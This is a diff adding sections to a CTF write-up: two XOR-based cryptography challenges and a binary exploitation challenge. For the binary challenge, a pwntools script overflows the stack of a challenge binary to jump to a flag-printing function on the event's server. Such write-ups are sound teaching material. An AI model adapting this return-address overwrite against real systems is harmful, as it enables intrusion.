@@ -8,6 +8,11 @@ This is my writeup for the challenges in H@cktivityCon CTF 2020, I'll try adding
 
 
 # Table of Content
+* [Cryptography](#cryptography)
+  - [Tyrannosaurus Rex](#tyrannosaurus-rex)
+  - [Perfect XOR](#perfect-xor)
+* [Binary Exploitation](#binary-exploitation)
+  - [Pancakes](#pancakes)
 * [Web](#web)
   - [Ladybug](#ladybug)
   - [Bite](#bite)
@@ -15,6 +20,243 @@ This is my writeup for the challenges in H@cktivityCon CTF 2020, I'll try adding
   - [Waffle Land](#waffle-land)
   - [Lightweight Contact Book](#lightweight-contact-book)
   - [Template Shack](#template-shack)
+
+# Cryptography
+
+## Tyrannosaurus Rex
+We found this fossil. Can you reverse time and bring this back to life?
+
+Download the file below.\
+[fossil](assets//scripts//fossil)
+
+**`flag{tyrannosauras_xor_in_reverse}`**
+
+**Solution:** With the challenge we get a file named fossil, running the file command reveals that the file is actually a python script:
+
+```python
+#!/usr/bin/env python
+
+import base64
+import binascii
+
+h = binascii.hexlify
+b = base64.b64encode
+
+c = b'37151032694744553d12220a0f584315517477520e2b3c226b5b1e150f5549120e5540230202360f0d20220a376c0067'
+
+def enc(f):
+    e = b(f)
+    z = []
+    i = 0
+    while i < len(e):
+        z += [ e[i] ^ e[((i + 1) % len(e))]]
+        i = i + 1
+    c = h(bytearray(z))
+    return c
+```
+This script contains an function called enc which is seemingly an encryption scheme and a variable c which we could guess is the product of running the function enc on the flag, so we may need to build a decryption scheme matching the encryption scheme implemented, for my sanity let's first deobfuscate the code a bit:
+
+```python
+#!/usr/bin/env python
+
+import base64
+import binascii
+
+cipher = b'37151032694744553d12220a0f584315517477520e2b3c226b5b1e150f5549120e5540230202360f0d20220a376c0067'
+
+def encyption(flag):
+    encoded = base64.b64encode(flag)
+    z = []
+    for i in range(len(encoded))
+        z += [ encoded[i] ^ encoded[((i + 1) % len(encoded))]]
+    c = binascii.hexlify(bytearray(z))
+    return c
+```
+Much better, now that we can actually read the code let's see what it does, the function first encodes the string to base64, then iterates over each character and xors each one with the one after it (the last character is xorred with the first), the bytes received by xorring are placed in an array and the final array of bytes is encoded to hex.\
+We can break it down to 3 parts: base64 encoding, cyclic xorring and hex encoding, the first and the last are easy to reverse, but the second part is trickier.\
+We can notice something interesting with the encryption in the second part, if we think of the first character as the initialization vector, then the encryption is similar to Cipher Block Chaining (CBC) mode of operation with no encryption and a block size of one, Cipher Block Chaining or CBC is a block cipher mode of operation, block ciphers split the plaintext into blocks of a size manageable by a cipher (for example AES works with blocks of sizes 128, 192 and 256 bits) and append the resulting ciphertext blocks together, a schema of the operation of CBC encryption:
+
+<div align=center>
+  <img src='assets//images//fossil_1.png' style="background-color:white;" >
+</div>
+
+
+So in our case because there is no encryption the only value needed for decryption is the initialization vector or in other words the only thing that we miss on order to encrypt the whole ciphertext is the first letter....so we can just bruteforce it!
+
+For people who didn't understand my reasoning, if we know the first letter we can xor it with the first character in the ciphertext to get the second character in the plaintext (by the properties of xor for value a,b we get that a ^ b ^ b = a and the first character in the cipher text is the first character in the plaintext xorred with the second character in the plaintext), and by using the second character we can get the third character doing the same operations and so on until we have decrypted all the ciphertext.
+
+for the decryption I wrote the following script which goes through all the character in base64 and for each one tries to decrypt the message as if it's the first character in the plaintext:
+
+```python
+#!/usr/bin/env python
+
+import base64
+import binascii
+import string
+
+def dec(f):
+	# part 3 - hex
+	z = binascii.unhexlify(f)
+	# part 2 - cyclic xorring (CBC)
+	for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + '/+=':
+		e = bytearray([ord(c)])
+		for i in range(len(z) - 1):
+			e += bytearray([z[i] ^ e[i]])
+		# part 3 - base64
+		try:
+			p = base64.b64decode(e)
+			# checks if the flag is in the plaintext
+			if b'flag' in p:
+				print(c, p.decode('utf-8'))
+		except:
+			continue
+```
+
+and by running this script we get the flag:
+
+![](assets//images//fossil_2.png)
+
+**Resources:**
+* Block Cipher: https://en.wikipedia.org/wiki/Block_cipher
+* Block Cipher modes of operation and CBC: https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation
+
+## Perfect XOR
+Can you decrypt the flag?
+
+Download the file below.\
+[decrypt.py](assets//scripts//decrypt.py)
+
+**`flag{tHE_br0kEN_Xor}`**
+
+**Solution:** with the challenge we get a python script:
+
+```python
+import base64
+n = 1
+i = 0
+cipher_b64 = b"MTE0LDg0LDQzNyw4MDk1LDMzNTUwNDM0LDg1ODk4NjkxNzAsMTM3NDM4NjkxMzc2LDIzMDU4NDMwMDgxMzk5NTIyMzUsMjY1ODQ1NTk5MTU2OTgzMTc0NDY1NDY5MjYxNTk1Mzg0MjI0NSwxOTE1NjE5NDI2MDgyMzYxMDcyOTQ3OTMzNzgwODQzMDM2MzgxMzA5OTczMjE1NDgxNjkyOTQsMTMxNjQwMzY0NTg1Njk2NDgzMzcyMzk3NTM0NjA0NTg3MjI5MTAyMjM0NzIzMTgzODY5NDMxMTc3ODM3MjgyMjMsMTQ0NzQwMTExNTQ2NjQ1MjQ0Mjc5NDYzNzMxMjYwODU5ODg0ODE1NzM2Nzc0OTE0NzQ4MzU4ODkwNjYzNTQzNDkxMzExOTkxNTIyMTYsMjM1NjI3MjM0NTcyNjczNDcwNjU3ODk1NDg5OTY3MDk5MDQ5ODg0Nzc1NDc4NTgzOTI2MDA3MTAxNDMwMjc1OTc1MDYzMzcyODMxNzg2MjIyMzk3MzAzNjU1Mzk2MDI2MDA1NjEzNjAyNTU1NjY0NjI1MDMyNzAxNzUwNTI4OTI1NzgwNDMyMTU1NDMzODI0OTg0Mjg3NzcxNTI0MjcwMTAzOTQ0OTY5MTg2NjQwMjg2NDQ1MzQxMjgwMzM4MzE0Mzk3OTAyMzY4Mzg2MjQwMzMxNzE0MzU5MjIzNTY2NDMyMTk3MDMxMDE3MjA3MTMxNjM1Mjc0ODcyOTg3NDc0MDA2NDc4MDE5Mzk1ODcxNjU5MzY0MDEwODc0MTkzNzU2NDkwNTc5MTg1NDk0OTIxNjA1NTU2NDcwODcsMTQxMDUzNzgzNzA2NzEyMDY5MDYzMjA3OTU4MDg2MDYzMTg5ODgxNDg2NzQzNTE0NzE1NjY3ODM4ODM4Njc1OTk5OTU0ODY3NzQyNjUyMzgwMTE0MTA0MTkzMzI5MDM3NjkwMjUxNTYxOTUwNTY4NzA5ODI5MzI3MTY0MDg3NzI0MzY2MzcwMDg3MTE2NzMxMjY4MTU5MzEzNjUyNDg3NDUwNjUyNDM5ODA1ODc3Mjk2MjA3Mjk3NDQ2NzIzMjk1MTY2NjU4MjI4ODQ2OTI2ODA3Nzg2NjUyODcwMTg4OTIwODY3ODc5NDUxNDc4MzY0NTY5MzEzOTIyMDYwMzcwNjk1MDY0NzM2MDczNTcyMzc4Njk1MTc2NDczMDU1MjY2ODI2MjUzMjg0ODg2MzgzNzE1MDcyOTc0MzI0NDYzODM1MzAwMDUzMTM4NDI5NDYwMjk2NTc1MTQzMzY4MDY1NTcwNzU5NTM3MzI4MjQy"
+
+def a(n):
+    b = 0
+    for i in range(1, n):
+        if(n % i == 0):
+            b += i
+    return b == n
+
+print("flag{", end='', flush=True)
+cipher = base64.b64decode(cipher_b64).decode().split(",")
+while(i < len(cipher)):
+    if (a(n)):
+        print(chr(int(cipher[i]) ^ n), end='', flush=True)
+        i += 1
+    n+=1
+
+print("}")
+```
+
+by the name of the file we can infer that the code is built to decrypt the ciphertext stored in cipher_b64 and hopefully give us the flag but it seems a little bit slow...
+
+![](assets//images//perfect_1.gif)
+
+at this point it's somewhat stop printing characters but still runs. This challenge is quite similar to a challenge nahamCon CTF called Homecooked (make sense as it's the same organizers), in it there was an inefficient primality check that made the code unreasonably slow, so we might be up against something like that, let's look at the code, it first prints the start of the flag format, then it decodes the ciphertext the ciphertext and split in into an array of strings, then for each string it tries to find a value of n bigger then the one used previously that makes a return the Boolean value True (for the first string it just finds the first one bigger then zero that "satisfy" a) it then xors the found n with the string and prints the result, this part is coded somewhat efficient, looking at the function a we see that for the parameter n the function goes through all the numbers smaller than n and checks if they divide n, if so it adds the value of the number to a running total, in the end the function check if the sum is equal to n and return True if so otherwise is returns False.\
+Basically function a checks if the sum of the divisors of n is equal to n, numbers that satisfy this are often called perfect numbers and there are more efficient ways to find them, we have discovered that all even perfect numbers are of the form p * ( p + 1 ) / 2  where p is a Mersenne prime, which are primes of the form 2 ** q - 1 for some prime q, furthermore we still haven't discovered odd perfect numbers so all the perfect numbers known to us (and important to this challenge) are even perfect number, so I took a list of q primes (the primes that make up Mersenne primes) off the internet and modified the code a bit so that instead of trying to find a perfect number it just used the next Mersenne prime to create one (I also tried to find a formatted list of perfect numbers or of Mersenne primes themselves but didn't find any):
+
+```python
+import base64
+from functools import reduce
+
+mersenne = [2, 3, 5, 7, 13, 17, 19, 31, 61, 89, 107, 127, 521, 607, 1279, 2203, 2281, 3217, 4253, 4423, 9689, 9941, 11213, 19937, 21701, 23209, 44497, 86243, 110503, 132049, 216091, 756839, 859433, 1257787, 1398269, 2976221, 3021377, 6972593, 13466917, 20996011, 24036583, 25964951, 30402457]
+
+
+i = 0
+cipher_b64 = b"MTE0LDg0LDQzNyw4MDk1LDMzNTUwNDM0LDg1ODk4NjkxNzAsMTM3NDM4NjkxMzc2LDIzMDU4NDMwMDgxMzk5NTIyMzUsMjY1ODQ1NTk5MTU2OTgzMTc0NDY1NDY5MjYxNTk1Mzg0MjI0NSwxOTE1NjE5NDI2MDgyMzYxMDcyOTQ3OTMzNzgwODQzMDM2MzgxMzA5OTczMjE1NDgxNjkyOTQsMTMxNjQwMzY0NTg1Njk2NDgzMzcyMzk3NTM0NjA0NTg3MjI5MTAyMjM0NzIzMTgzODY5NDMxMTc3ODM3MjgyMjMsMTQ0NzQwMTExNTQ2NjQ1MjQ0Mjc5NDYzNzMxMjYwODU5ODg0ODE1NzM2Nzc0OTE0NzQ4MzU4ODkwNjYzNTQzNDkxMzExOTkxNTIyMTYsMjM1NjI3MjM0NTcyNjczNDcwNjU3ODk1NDg5OTY3MDk5MDQ5ODg0Nzc1NDc4NTgzOTI2MDA3MTAxNDMwMjc1OTc1MDYzMzcyODMxNzg2MjIyMzk3MzAzNjU1Mzk2MDI2MDA1NjEzNjAyNTU1NjY0NjI1MDMyNzAxNzUwNTI4OTI1NzgwNDMyMTU1NDMzODI0OTg0Mjg3NzcxNTI0MjcwMTAzOTQ0OTY5MTg2NjQwMjg2NDQ1MzQxMjgwMzM4MzE0Mzk3OTAyMzY4Mzg2MjQwMzMxNzE0MzU5MjIzNTY2NDMyMTk3MDMxMDE3MjA3MTMxNjM1Mjc0ODcyOTg3NDc0MDA2NDc4MDE5Mzk1ODcxNjU5MzY0MDEwODc0MTkzNzU2NDkwNTc5MTg1NDk0OTIxNjA1NTU2NDcwODcsMTQxMDUzNzgzNzA2NzEyMDY5MDYzMjA3OTU4MDg2MDYzMTg5ODgxNDg2NzQzNTE0NzE1NjY3ODM4ODM4Njc1OTk5OTU0ODY3NzQyNjUyMzgwMTE0MTA0MTkzMzI5MDM3NjkwMjUxNTYxOTUwNTY4NzA5ODI5MzI3MTY0MDg3NzI0MzY2MzcwMDg3MTE2NzMxMjY4MTU5MzEzNjUyNDg3NDUwNjUyNDM5ODA1ODc3Mjk2MjA3Mjk3NDQ2NzIzMjk1MTY2NjU4MjI4ODQ2OTI2ODA3Nzg2NjUyODcwMTg4OTIwODY3ODc5NDUxNDc4MzY0NTY5MzEzOTIyMDYwMzcwNjk1MDY0NzM2MDczNTcyMzc4Njk1MTc2NDczMDU1MjY2ODI2MjUzMjg0ODg2MzgzNzE1MDcyOTc0MzI0NDYzODM1MzAwMDUzMTM4NDI5NDYwMjk2NTc1MTQzMzY4MDY1NTcwNzU5NTM3MzI4MjQy"
+
+
+print("flag{", end='', flush=True)
+cipher = base64.b64decode(cipher_b64).decode().split(",")
+while(i < len(cipher)):
+
+		p = 2 ** (mersenne[i] - 1) * (2 ** mersenne[i] - 1)
+		print(chr(int(cipher[i]) ^ p),end='', flush=True)
+		i += 1
+
+print("}")
+```
+
+And by running this more efficient code we get the flag in no time:
+
+![](assets//images//perfect_2.gif)
+
+**Resources:**
+* Perfect Number: https://en.wikipedia.org/wiki/Perfect_number
+* Mersenne Prime: https://en.wikipedia.org/wiki/Mersenne_prime
+* The list I used: https://www.math.utah.edu/~pa/math/mersenne.html#:~:text=p%20%3D%202%2C%203%2C%205,%2C%2024036583%2C%2025964951%2C%2030402457.
+
+# Binary Exploitation
+
+**Note:** For all the binary exploitation challenges I'll be working with [IDA free](https://www.hex-rays.com/products/ida/support/download_freeware/) and [pwntools](http://docs.pwntools.com/en/stable/)
+
+## Pancakes
+How many flap-jacks are on your stack?
+
+Connect with:\
+nc jh2i.com 50021
+
+[pancakes](assets//executables//pancakes)
+
+**Post-CTF Writeup**\
+**`flag{too_many_pancakes_on_the_stack}`**
+
+**Solution:** With the challenge we are given an executable and a port on a server running this executable, at first look we can see that the executable ask for how many pancakes we want and then prints us a nice ASCII art of pancakes:
+
+![](assets//images//pancakes_1.png)
+
+Okay now that we know what the executable does, let's see what we up against, using pwn.ELF() we can see which defenses the executable uses:
+
+<div align=center>
+  <img src="assets//images//pancakes_2.png">
+</div>
+
+
+We can see that the executable doesn't use canaries in order to protect from buffer overflows so might be able to overflow the return address and cause a segfault, let's try doing that:
+
+![](assets//images//pancakes_3.png)
+
+We got a segfault! if you've noticed I used cyclic to get a segfault, cyclic is a tool from pwntools which create a string with a cyclic behavior, we can use this string in order to find the relative distance of important values on the stack from the start of the buffer, the command `cyclic -n 8 400` creates a cyclic string with length of 400 with a length of 8 to each cyclical substring, let's try that again but now while debugging with IDA, by placing a breakpoint at the retn command and looking at the value in stack before the execution of the instruction we can get the relative distance from the return address:
+
+![](assets//images//pancakes_4.png)
+
+The value is `0x6161616161616174` or in ascii `aaaaaaat`, we can lookup the position of this string using the command `cyclic -n 8 -o taaaaaaa` notice that I wrote the string in reverse, that is because data is written to the stack from right to left, by running this command we get an offset of 152 from the start of the buffer, and we have a way to jump to any point in the executable by overflowing the stack right until the return address and then modifying the address to the one we choose, looking at the symbols we could see a function named secret_recipe, this function reads a file called flag.txt and then prints the content to the screen:
+
+![](assets//images//pancakes_5.png)
+
+this function obviously prints the flag, so let's jump to it, for that I wrote the following script in python using the pwn module, this script connect to the server or runs the executable, finds the address of the function secret_recipe and creates the matching payload so that the function execution will jump to it, send the payload as input and print the flag:
+
+```python
+from pwn import *
+import re
+
+e = ELF('pancakes')
+addr = p64(e.symbols['secret_recipe'])
+
+local = False
+if not local:
+	s = remote('jh2i.com', 50021)
+else:
+	s = process('pancakes')
+
+s.recv()
+s.sendline(b'A' * 152 + addr)
+response = s.recvall()
+print(re.findall('flag{.*}', response.decode('utf-8'))[0])
+s.close()
+```
+
+and in action:
+
+![](assets//images//pancakes_6.png)
+
+
 
 # Web
 
